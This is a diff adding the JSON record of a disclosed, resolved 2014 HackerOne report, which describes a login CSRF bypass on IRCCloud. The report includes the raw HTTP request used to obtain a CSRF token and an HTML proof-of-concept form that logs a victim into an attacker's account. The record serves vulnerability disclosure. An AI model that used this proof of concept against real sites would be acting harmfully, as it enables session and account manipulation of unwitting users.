@@ -1,0 +1,105 @@
+{
+  "id": 7531,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTMx",
+  "url": "https://hackerone.com/reports/7531",
+  "title": "Login CSRF can be bypassed (Similar approach to previous one).",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2014-04-14T13:24:23.085Z",
+  "submitted_at": "2014-04-14T13:24:23.085Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "uname",
+    "url": "/uname",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/141/ff8c88be8b483b37b102c373b27d1f8d17468d26_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 140,
+    "url": "https://hackerone.com/irccloud",
+    "handle": "irccloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "IRCCloud",
+      "twitter_handle": "irccloud",
+      "website": "https://www.irccloud.com",
+      "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2014-05-20T12:03:13.727Z",
+  "bug_reporter_agreed_on_going_public_at": "2014-05-20T12:03:13.578Z",
+  "team_member_agreed_on_going_public_at": "2014-04-29T17:23:27.578Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The login CSRF protection currently implemented is not adequate and can be bypassed pretty easily.\r\n\r\nAn attacker can easily obtain a CSRF token from the server by initiating the following request:\r\n\r\nPOST /chat/auth-formtoken HTTP/1.1\r\nHost: www.irccloud.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0\r\nAccept: application/json, text/javascript, /; q=0.01\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nReferer: https://www.irccloud.com/\r\nContent-Length: 8\r\nCookie: session=\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n_reqid=1\r\n\r\nOnce this request is sent an attacker would receive a valid CSRF token. In my case I received \"1397481736.3b1f59ae47e1a139e8a631b2589dfae2\"\r\n\r\nOnce I have a valid CSRF token, I can conduct a login CSRF attack against a victim using the following PoC. Notice the CSRF token is the one received above.\r\n\r\n<html>\r\n  <body>\r\n    <form action=\"https://www.irccloud.com/chat/login\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"email\" value=\"ATTACKER-EMAIL\" />\r\n      <input type=\"hidden\" name=\"password\" value=\"ATTACKER-PASSWORD\" />\r\n      <input type=\"hidden\" name=\"org&#95;invite\" value=\"\" />\r\n      <input type=\"hidden\" name=\"token\" value=\"1397481736&#46;3b1f59ae47e1a139e8a631b2589dfae2\" />\r\n      <input type=\"hidden\" name=\"&#95;reqid\" value=\"2\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\nThis has basically defeated the CSRF protection offered by the application. When a victim submits the above request, the victim would be logged into the attackers account.\r\n",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2014-05-29T17:22:35.928Z",
+  "allow_singular_disclosure_after": -306439430.15313643,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "sameerphad72",
+    "shubham_srt",
+    "cryptographer",
+    "shivammusic",
+    "zeesek"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
